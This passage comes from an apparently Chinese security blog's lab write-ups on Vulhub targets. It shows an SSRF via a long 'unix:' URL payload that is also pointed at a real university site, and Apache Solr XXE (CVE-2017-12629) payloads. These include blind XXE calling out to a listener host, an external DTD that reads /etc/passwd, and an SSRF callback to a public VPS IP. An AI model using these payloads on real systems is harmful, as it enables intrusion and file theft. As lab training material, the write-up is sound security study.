+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311222300967.png" alt="返回页面" style="zoom:80%;" />
+
+<h1 id="访问重邮官网"><a href="#访问重邮官网" class="headerlink" title="访问重邮官网"></a>访问重邮官网</h1><p>只需要将上面payload的example的url改成重邮的官网，构造http请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.cqupt.edu.cn/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送请求，成功访问重邮官网</p>
+<img data-src="https://images.gaifagafin.top/202311222300054.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache solr XXE漏洞(CVE-2017-12629)</title>
+    <url>/2023/11/22/Apache-solr-XXE%E6%BC%8F%E6%B4%9E(CVE-2017-12629)/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache solr XXE漏洞(CVE-2017-12629)</p>
+<ol>
+<li>复现环境中的XXE漏洞，截图证明</li>
+<li>利用XXE漏洞发送HTTP请求，在VPS服务器接收请求，或收到DNS记录。（SSRF利用）</li>
+<li>利用XXE漏洞读取本地的 &#x2F;etc&#x2F;passwd文件。（文件读取利用）</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞文件目录下，运行漏洞环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>一般情况下，有些网站会支持XML-RPC（XML Remote Procedure Call），用户提交数据格式如下：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxe</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aaa.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;student&gt;</span><br><span class="line">&lt;useername&gt;xxx&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yyy&lt;/password&gt;</span><br><span class="line">&lt;address&gt;zzz&lt;/address&gt;</span><br><span class="line">&lt;/student&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可通过插入DTD标签来读取文件：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxe</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aaa.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;student&gt;</span><br><span class="line">&lt;useername&gt;xxx&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yyy&lt;/password&gt;</span><br><span class="line">&lt;address&gt;zzz&lt;/address&gt;</span><br><span class="line">&lt;/student&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞复现"><a href="#XXE漏洞复现" class="headerlink" title="XXE漏洞复现"></a>XXE漏洞复现</h2><p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>将其进行<strong>url编码</strong>：</p>
+<p><img data-src="https://images.gaifagafin.top/202311222302622.png"></p>
+<p>发送的http包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/demo/select?q=&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//192.168.137.1%3a6666&quot;&gt;%25remote%3b]&gt;&lt;root/&gt;&amp;wt=xml&amp;defType=xmlparser</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>mLvnBZTNP4mtS=5Z6BRWE9ckgj5fVytACBSQ8aUystMk7Xqg5ADwRXx9DCR4ti2XwAEqlXYac1OobPa1mooZWhy38M7.LkRxVTZoq; _xsrf=2|cc5a6916|387e0088d1426ad0f563ffb88c9227eb|1700298115</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br></pre></td></tr></table></figure>
+
+<p>在宿主机的cmd窗口输入<code>python -m http.server 6666</code>或者<code>nc -lvp 6666</code></p>
+<p>监听6666端口</p>
+<img data-src="https://images.gaifagafin.top/202311222302835.png" style="zoom:80%;" />
+
+<img data-src="https://images.gaifagafin.top/202311222303032.png" style="zoom:80%;" />
+
+<p>将构造的http请求发送</p>
+<img data-src="https://images.gaifagafin.top/202311222303090.png" style="zoom:80%;" />
+
+<p>由于这是<strong>blind XXE</strong>，页面不会回显，但刚刚创建的http服务器可以收到请求</p>
+<img data-src="https://images.gaifagafin.top/202311222303346.png" style="zoom:80%;" />
+
+<p>使用<code>nc</code>监听也可以收到java请求，内容更详细</p>
+<img data-src="https://images.gaifagafin.top/202311222303643.png" style="zoom:80%;" />
+
+<p>接下来利用<strong>Error Based XXE</strong>读取文件</p>
+<p>首先在宿主机www目录下新建1.dtd,写入下面内容读取&#x2F;etc文件夹内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[<span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
+<img data-src="https://images.gaifagafin.top/202311222303378.png" style="zoom:80%;" />
+
+<p>发送请求后，成功读取到<code>/etc</code>文件夹内容</p>
+<img data-src="https://images.gaifagafin.top/202311222303592.png" style="zoom:80%;" />
+
+<h1 id="SSRF利用-VPS接收请求"><a href="#SSRF利用-VPS接收请求" class="headerlink" title="SSRF利用(VPS接收请求)"></a>SSRF利用(VPS接收请求)</h1><p>基于漏洞复现中的内容，直接构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.109.111.193:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
+<img data-src="https://images.gaifagafin.top/202311222303570.png" style="zoom:80%;" />
+
+<p>发送请求后，在VPS服务器上接收到请求</p>
+<img data-src="https://images.gaifagafin.top/202311222303536.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd"><a href="#读取-etc-passwd" class="headerlink" title="读取&#x2F;etc&#x2F;passwd"></a>读取&#x2F;etc&#x2F;passwd</h1><p>将<code>1.dtd</code>中的内容改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[<span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
